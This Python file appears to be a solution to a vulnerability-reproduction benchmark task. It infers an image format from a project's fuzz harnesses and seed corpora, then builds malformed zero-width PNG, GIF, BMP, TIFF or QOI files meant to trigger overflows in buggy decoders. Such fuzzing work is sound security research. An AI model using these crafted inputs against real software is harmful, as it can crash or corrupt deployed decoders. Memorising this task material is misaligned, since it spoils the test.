import os
import re
import io
import tarfile
import zipfile
import tempfile
import shutil
import struct
import zlib
from typing import Optional, Dict, List, Tuple


def _is_within_directory(directory: str, target: str) -> bool:
    directory = os.path.abspath(directory)
    target = os.path.abspath(target)
    try:
        common = os.path.commonpath([directory, target])
    except Exception:
        return False
    return common == directory


def _safe_extract_tar(t: tarfile.TarFile, path: str) -> None:
    for member in t.getmembers():
        member_path = os.path.join(path, member.name)
        if not _is_within_directory(path, member_path):
            continue
        try:
            t.extract(member, path=path, set_attrs=False)
        except Exception:
            pass


def _extract_src(src_path: str) -> str:
    if os.path.isdir(src_path):
        return src_path

    tmp = tempfile.mkdtemp(prefix="poc_src_")
    try:
        if zipfile.is_zipfile(src_path):
            with zipfile.ZipFile(src_path, "r") as z:
                for info in z.infolist():
                    if info.is_dir():
                        continue
                    out_path = os.path.join(tmp, info.filename)
                    if not _is_within_directory(tmp, out_path):
                        continue
                    os.makedirs(os.path.dirname(out_path), exist_ok=True)
                    try:
                        with z.open(info, "r") as rf, open(out_path, "wb") as wf:
                            shutil.copyfileobj(rf, wf, length=1024 * 1024)
                    except Exception:
                        pass
        else:
            with tarfile.open(src_path, "r:*") as t:
                _safe_extract_tar(t, tmp)
    except Exception:
        pass

    # Choose root if single dir
    try:
        entries = [e for e in os.listdir(tmp) if e not in (".", "..")]
        if len(entries) == 1:
            root = os.path.join(tmp, entries[0])
            if os.path.isdir(root):
                return root
    except Exception:
        pass
    return tmp


def _read_prefix(path: str, n: int = 64) -> bytes:
    try:
        with open(path, "rb") as f:
            return f.read(n)
    except Exception:
        return b""


def _classify_magic(data: bytes) -> Optional[str]:
    if len(data) >= 8 and data[:8] == b"\x89PNG\r\n\x1a\n":
        return "png"
    if len(data) >= 6 and (data[:6] == b"GIF87a" or data[:6] == b"GIF89a"):
        return "gif"
    if len(data) >= 2 and data[:2] == b"BM":
        return "bmp"
    if len(data) >= 3 and data[:3] == b"\xFF\xD8\xFF":
        return "jpeg"
    if len(data) >= 4 and (data[:4] == b"II*\x00" or data[:4] == b"MM\x00*"):
        return "tiff"
    if len(data) >= 12 and data[:4] == b"RIFF" and data[8:12] == b"WEBP":
        return "webp"
    if len(data) >= 12 and data[4:8] == b"ftyp":
        brand = data[8:12]
        if brand in (b"avif", b"avis"):
            return "avif"
        if brand in (b"heic", b"heix", b"mif1", b"msf1", b"hevc", b"hevx"):
            return "heif"
        return "isobmff"
    if len(data) >= 4 and data[:4] == b"qoif":
        return "qoi"
    if len(data) >= 4 and data[:4] == b"8BPS":
        return "psd"
    if len(data) >= 4 and data[:4] == b"DDS ":
        return "dds"
    if len(data) >= 4 and data[:4] == b"\x76\x2f\x31\x01":
        return "exr"
    if len(data) >= 2 and data[:2] == b"P1":
        return "pnm"
    if len(data) >= 2 and data[:2] == b"P2":
        return "pnm"
    if len(data) >= 2 and data[:2] == b"P3":
        return "pnm"
    if len(data) >= 2 and data[:2] == b"P4":
        return "pnm"
    if len(data) >= 2 and data[:2] == b"P5":
        return "pnm"
    if len(data) >= 2 and data[:2] == b"P6":
        return "pnm"
    return None


def _iter_candidate_files(root: str, max_files: int = 400) -> List[str]:
    candidates = []
    wanted_dirs = ("seed", "corpus", "test", "tests", "testdata", "data", "samples", "sample", "fuzz", "fuzzer", "oss-fuzz")
    for dirpath, dirnames, filenames in os.walk(root):
        low = dirpath.lower()
        if not any(w in low for w in wanted_dirs):
            # still allow scanning a bit for harness files below
            pass
        for fn in filenames:
            fl = fn.lower()
            p = os.path.join(dirpath, fn)
            if fl.endswith((".zip", ".png", ".gif", ".bmp", ".jpg", ".jpeg", ".tif", ".tiff", ".webp", ".avif", ".heic", ".heif", ".qoi", ".pnm", ".ppm", ".pgm", ".pbm")):
                candidates.append(p)
            elif any(k in fl for k in ("seed_corpus", "seedcorpus", "corpus")) and fl.endswith(".zip"):
                candidates.append(p)
            if len(candidates) >= max_files:
                return candidates
    return candidates


def _collect_seed_magic_counts(root: str) -> Dict[str, int]:
    counts: Dict[str, int] = {}
    files = _iter_candidate_files(root, max_files=500)
    for p in files:
        pl = p.lower()
        if pl.endswith(".zip") and (("seed" in pl) or ("corpus" in pl)):
            try:
                with zipfile.ZipFile(p, "r") as z:
                    n = 0
                    for info in z.infolist():
                        if info.is_dir():
                            continue
                        if info.file_size <= 0 or info.file_size > 2_000_000:
                            continue
                        try:
                            with z.open(info, "r") as f:
                                data = f.read(64)
                        except Exception:
                            continue
                        fmt = _classify_magic(data)
                        if fmt:
                            counts[fmt] = counts.get(fmt, 0) + 3
                        n += 1
                        if n >= 50:
                            break
            except Exception:
                pass
        else:
            data = _read_prefix(p, 64)
            fmt = _classify_magic(data)
            if fmt:
                counts[fmt] = counts.get(fmt, 0) + 1
            else:
                # try by extension
                ext = os.path.splitext(p)[1].lower()
                extmap = {
                    ".png": "png",
                    ".gif": "gif",
                    ".bmp": "bmp",
                    ".jpg": "jpeg",
                    ".jpeg": "jpeg",
                    ".tif": "tiff",
                    ".tiff": "tiff",
                    ".webp": "webp",
                    ".avif": "avif",
                    ".heic": "heif",
                    ".heif": "heif",
                    ".qoi": "qoi",
                    ".pnm": "pnm",
                    ".ppm": "pnm",
                    ".pgm": "pnm",
                    ".pbm": "pnm",
                }
                if ext in extmap:
                    counts[extmap[ext]] = counts.get(extmap[ext], 0) + 1
    return counts


def _iter_harness_files(root: str, max_files: int = 120) -> List[str]:
    out = []
    for dirpath, dirnames, filenames in os.walk(root):
        low = dirpath.lower()
        if not any(k in low for k in ("fuzz", "fuzzer", "oss-fuzz")):
            continue
        for fn in filenames:
            fl = fn.lower()
            if fl.endswith((".c", ".cc", ".cpp", ".cxx")) and ("fuzz" in fl or "fuzzer" in fl or "llvmfuzzer" in fl):
                out.append(os.path.join(dirpath, fn))
                if len(out) >= max_files:
                    return out
    # fallback: any file containing LLVMFuzzerTestOneInput
    for dirpath, dirnames, filenames in os.walk(root):
        for fn in filenames:
            fl = fn.lower()
            if not fl.endswith((".c", ".cc", ".cpp", ".cxx")):
                continue
            p = os.path.join(dirpath, fn)
            try:
                with open(p, "rb") as f:
                    chunk = f.read(20000)
                if b"LLVMFuzzerTestOneInput" in chunk or b"FuzzerTestOneInput" in chunk:
                    out.append(p)
                    if len(out) >= max_files:
                        return out
            except Exception:
                pass
    return out


def _collect_harness_hints(root: str) -> Dict[str, int]:
    counts: Dict[str, int] = {}
    files = _iter_harness_files(root)
    pat_map = [
        ("png", [rb"\bpng_", rb"png\.h", rb"IHDR", rb"libpng", rb"spng", rb"lodepng"]),
        ("tiff", [rb"tiffio\.h", rb"\bTIFF", rb"libtiff"]),
        ("gif", [rb"gif_lib\.h", rb"\bDGif", rb"\bEGif"]),
        ("jpeg", [rb"jpeglib\.h", rb"\bjpeg_", rb"\bJDIMENSION"]),
        ("webp", [rb"webp/decode\.h", rb"WebPDecode", rb"libwebp"]),
        ("heif", [rb"libheif", rb"\bheif_", rb"heif\.h"]),
        ("avif", [rb"\bavif", rb"avif/avif\.h", rb"avifDecoder"]),
        ("qoi", [rb"\bqoi", rb"qoif"]),
        ("pnm", [rb"\bpnm", rb"\bppm", rb"\bpgm", rb"\bpbm"]),
        ("exr", [rb"openexr", rb"\bEXR", rb"Imf"]),
        ("bmp", [rb"\bbmp", rb"BITMAPINFOHEADER"]),
        ("dds", [rb"\bdds\b", rb"DDS "]),
        ("psd", [rb"\bpsd\b", rb"8BPS"]),
    ]
    for p in files:
        try:
            with open(p, "rb") as f:
                data = f.read(50000)
        except Exception:
            continue
        for fmt, pats in pat_map:
            s = 0
            for pat in pats:
                if re.search(pat, data, flags=re.IGNORECASE):
                    s += 2
            if s:
                counts[fmt] = counts.get(fmt, 0) + s
    return counts


def _infer_format(root: str) -> str:
    seed_counts = _collect_seed_magic_counts(root)
    hint_counts = _collect_harness_hints(root)

    combined: Dict[str, int] = {}
    for k, v in seed_counts.items():
        combined[k] = combined.get(k, 0) + 5 * v
    for k, v in hint_counts.items():
        combined[k] = combined.get(k, 0) + v

    if combined:
        best = max(combined.items(), key=lambda kv: kv[1])[0]
        # prefer concrete over generic isobmff
        if best == "isobmff":
            if combined.get("heif", 0) >= combined.get("avif", 0) and combined.get("heif", 0) > 0:
                return "heif"
            if combined.get("avif", 0) > 0:
                return "avif"
        return best

    # last resort: scan for common keywords in repository
    try:
        txt_hits = {"png": 0, "tiff": 0, "gif": 0, "jpeg": 0, "webp": 0, "heif": 0, "avif": 0, "qoi": 0}
        for dirpath, dirnames, filenames in os.walk(root):
            for fn in filenames:
                fl = fn.lower()
                if not fl.endswith((".md", ".txt", ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".cmake", "cmakelists.txt")):
                    continue
                p = os.path.join(dirpath, fn)
                try:
                    with open(p, "rb") as f:
                        data = f.read(20000)
                except Exception:
                    continue
                low = data.lower()
                for k in list(txt_hits.keys()):
                    if k.encode() in low:
                        txt_hits[k] += 1
        best = max(txt_hits.items(), key=lambda kv: kv[1])[0]
        if txt_hits[best] > 0:
            return best
    except Exception:
        pass

    return "png"


def _png_chunk(chunk_type: bytes, data: bytes) -> bytes:
    ln = struct.pack(">I", len(data))
    crc = zlib.crc32(chunk_type)
    crc = zlib.crc32(data, crc) & 0xFFFFFFFF
    return ln + chunk_type + data + struct.pack(">I", crc)


def _make_png_zero_width(height: int = 1) -> bytes:
    sig = b"\x89PNG\r\n\x1a\n"
    width = 0
    ihdr = struct.pack(">IIBBBBB", width, max(0, height), 8, 2, 0, 0, 0)
    ihdr_chunk = _png_chunk(b"IHDR", ihdr)
    raw = b"\x00" * max(1, height)  # at least one filter byte per row; width=0 => no pixel bytes
    # For height>1, raw must be height filter bytes; use that.
    raw = b"\x00" * max(1, height)
    comp = zlib.compress(raw, level=9)
    idat_chunk = _png_chunk(b"IDAT", comp)
    iend_chunk = _png_chunk(b"IEND", b"")
    return sig + ihdr_chunk + idat_chunk + iend_chunk


def _make_gif_zero_width(height: int = 1) -> bytes:
    # Minimal GIF with GCT and single image; set image width to 0
    h = b"GIF89a"
    screen_w = 0
    screen_h = max(1, height) & 0xFFFF
    packed = 0xF0  # GCT flag 1, color res 7, sort 0, size 0 => 2 colors
    lsd = struct.pack("<HHBBB", screen_w, screen_h, packed, 0, 0)
    gct = b"\x00\x00\x00\xff\xff\xff"  # 2 colors
    # Image Descriptor
    img_w = 0
    img_h = max(1, height) & 0xFFFF
    idsc = b"\x2C" + struct.pack("<HHHHB", 0, 0, img_w, img_h, 0)
    # LZW: use a known valid 1x1 stream (decoder should still try to write pixels)
    # Min code size 2, data sub-block: 2 bytes (0x4C,0x01), terminator 0
    img_data = b"\x02" + b"\x02" + b"\x4C\x01" + b"\x00"
    trailer = b"\x3B"
    return h + lsd + gct + idsc + img_data + trailer


def _make_bmp_zero_width(height: int = 1) -> bytes:
    # BITMAPFILEHEADER (14) + BITMAPINFOHEADER (40)
    w = 0
    h = max(1, height)
    bpp = 24
    # Row size in BMP is padded to 4 bytes; with width 0 => 0
    pixel_data = b"\x00" * 4  # add some bytes to encourage read/write paths
    off_bits = 14 + 40
    file_size = off_bits + len(pixel_data)
    bf = b"BM" + struct.pack("<IHHI", file_size, 0, 0, off_bits)
    bi = struct.pack("<IIIHHIIIIII",
                     40, w & 0xFFFFFFFF, h & 0xFFFFFFFF, 1, bpp, 0,
                     len(pixel_data), 2835, 2835, 0, 0)
    return bf + bi + pixel_data


def _make_tiff_zero_width(height: int = 1) -> bytes:
    # Little-endian baseline TIFF with width=0, height=1, uncompressed RGB
    # Provide strip bytecounts > 0 and pixel bytes to encourage overflow in buggy code.
    w = 0
    h = max(1, height)

    # Header
    header = b"II*\x00" + struct.pack("<I", 8)

    # Tags
    # Entries:
    # 256 ImageWidth LONG 1 value
    # 257 ImageLength LONG 1 value
    # 258 BitsPerSample SHORT 3 offset
    # 259 Compression SHORT 1 value 1
    # 262 PhotometricInterpretation SHORT 1 value 2
    # 273 StripOffsets LONG 1 value offset
    # 277 SamplesPerPixel SHORT 1 value 3
    # 278 RowsPerStrip LONG 1 value 1
    # 279 StripByteCounts LONG 1 value 3
    # 284 PlanarConfiguration SHORT 1 value 1
    N = 10

    ifd_offset = 8
    ifd_size = 2 + N * 12 + 4
    bits_offset = ifd_offset + ifd_size
    bits_data = struct.pack("<HHH", 8, 8, 8)
    img_offset = bits_offset + len(bits_data)
    img_data = b"\x00\x00\x00"  # 1 RGB pixel

    def entry(tag: int, typ: int, count: int, value_or_offset: int) -> bytes:
        return struct.pack("<HHII", tag, typ, count, value_or_offset)

    entries = []
    entries.append(entry(256, 4, 1, w))
    entries.append(entry(257, 4, 1, h))
    entries.append(entry(258, 3, 3, bits_offset))
    entries.append(entry(259, 3, 1, 1))
    entries.append(entry(262, 3, 1, 2))
    entries.append(entry(273, 4, 1, img_offset))
    entries.append(entry(277, 3, 1, 3))
    entries.append(entry(278, 4, 1, 1))
    entries.append(entry(279, 4, 1, len(img_data)))
    entries.append(entry(284, 3, 1, 1))

    ifd = struct.pack("<H", N) + b"".join(entries) + struct.pack("<I", 0)
    return header + ifd + bits_data + img_data


def _make_qoi_zero_width(height: int = 1) -> bytes:
    # QOI header with width=0, height=1; add some bytes + end marker
    w = 0
    h = max(1, height)
    header = b"qoif" + struct.pack(">II", w, h) + bytes([4, 0])
    # Provide a pixel chunk even though width=0 to stress buggy decoders
    # QOI_OP_RGBA: 0xFF R G B A
    body = b"\xFF\x00\x00\x00\xFF"
    end = b"\x00\x00\x00\x00\x00\x00\x00\x01"
    return header + body + end


def _make_fallback() -> bytes:
    # Try a minimal PNG with width=0 as a generic image PoC
    return _make_png_zero_width(1)


def _generate_poc(fmt: str) -> bytes:
    fmt = (fmt or "").lower()
    if fmt == "png":
        return _make_png_zero_width(1)
    if fmt == "tiff":
        return _make_tiff_zero_width(1)
    if fmt == "gif":
        return _make_gif_zero_width(1)
    if fmt == "bmp":
        return _make_bmp_zero_width(1)
    if fmt == "qoi":
        return _make_qoi_zero_width(1)
    # If unknown or complex container formats, fallback to PNG attempt
    return _make_fallback()


class Solution:
    def solve(self, src_path: str) -> bytes:
        root = _extract_src(src_path)
        tmp_to_cleanup = None
        if root != src_path and not os.path.isdir(src_path):
            # root is inside temp dir; cleanup parent
            tmp_to_cleanup = root
            # walk up to created temp dir if possible
            # if root is the temp dir itself or inside it, find that temp prefix
            cur = root
            for _ in range(3):
                parent = os.path.dirname(cur)
                if parent and os.path.basename(parent).startswith("poc_src_"):
                    tmp_to_cleanup = parent
                    break
                cur = parent

        try:
            fmt = _infer_format(root)
            poc = _generate_poc(fmt)
            return poc
        finally:
            if tmp_to_cleanup and os.path.isdir(tmp_to_cleanup):
                try:
                    shutil.rmtree(tmp_to_cleanup, ignore_errors=True)
                except Exception:
                    pass